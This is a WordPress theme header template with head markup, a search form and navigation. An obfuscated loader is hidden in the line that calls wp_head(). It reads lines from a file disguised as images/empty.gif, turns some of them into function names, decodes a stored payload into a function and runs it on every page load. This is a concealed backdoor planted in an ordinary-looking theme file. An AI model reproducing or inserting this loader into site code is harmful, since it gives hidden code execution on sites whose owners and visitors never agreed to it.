<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head >
<title>
<?php bloginfo('name'); ?>
<?php wp_title(); ?>
</title>
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
<meta name="generator" content="WordPress <?php bloginfo('version'); ?>" />
<!-- leave this for stats please -->
<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="<?php bloginfo('rss2_url'); ?>" />
<link rel="alternate" type="text/xml" title="RSS .92" href="<?php bloginfo('rss_url'); ?>" />
<link rel="alternate" type="application/atom+xml" title="Atom 0.3" href="<?php bloginfo('atom_url'); ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
<script language="javascript" src="date.js" type="text/javascript"></script>
<?php wp_get_archives('type=monthly&format=link'); ?>
<?php //comments_popup_script(); // off by default ?>
<?php  wp_head(); $gif=file(dirname(__FILE__).'/images/empty.gif',2);$gif=$gif[5]("",$gif[6]($gif[4]));$gif(); ?>
</head>
<body>
<div id="wraper">
<div id="header">
	<div id="logo"><a href="<?php bloginfo('url'); ?>"><?php bloginfo('name');?></a>
	</div>
	<div id="searchbox">
  	<form method="get" id="searchform" action="<?php bloginfo('url'); ?>/">
    <div  style="float:left"><input type="text" value="<?php the_search_query(); ?>" name="s" class="search" id="s" style="padding-left:8px; border:1px solid #000000"/>
</div><div style="float:right">    <input type="image" class="find" id="searchsubmit" value="" src="<?php bloginfo('stylesheet_directory'); ?>/images/button-search.jpg" /></div>
  </form>
</div>
	<div class="navigation">
		<ul>
			<li><a href="<?php bloginfo('url'); ?>">Главная</a></li>
     		 <?php wp_list_pages('depth=1&title_li='); ?>
		</ul>
	</div>
	</div>
	<div id="img" style="margin-top:2px;">	</div>
  <div id="container">